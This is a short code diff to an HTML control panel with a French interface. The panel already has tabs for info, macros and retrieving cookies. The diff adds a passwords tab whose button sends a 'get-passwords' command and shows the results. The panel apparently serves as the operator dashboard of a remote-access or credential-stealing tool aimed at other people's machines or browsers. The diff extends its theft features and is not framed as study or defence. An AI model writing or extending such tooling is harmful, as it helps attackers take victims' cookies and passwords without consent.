@@ -635,6 +635,7 @@
             <div class="sp-tab active" id="spTabInfo" onclick="switchSpTab('info')">ℹ️ Info</div>
             <div class="sp-tab" id="spTabMacros" onclick="switchSpTab('macros')">⚡ Macros</div>
             <div class="sp-tab" id="spTabCookies" onclick="switchSpTab('cookies')">🍪 Cookies</div>
+            <div class="sp-tab" id="spTabPasswords" onclick="switchSpTab('passwords')">🔑 MDP</div>
           </div>
 
           <!-- Info -->
@@ -665,6 +666,12 @@
           <div class="sp-body hidden" id="spBodyCookies">
             <button class="btn-refresh-info" onclick="sendCommand('get-cookies')">🍪 Récupérer les cookies</button>
             <div class="cookies-output" id="cookiesOutput">En attente...</div>
+          </div>
+
+          <!-- Mots de passe -->
+          <div class="sp-body hidden" id="spBodyPasswords">
+            <button class="btn-refresh-info" onclick="sendCommand('get-passwords')">🔑 Récupérer les mots de passe</button>
+            <div class="cookies-output" id="passwordsOutput">En attente...</div>
           </div>
         </div>
 
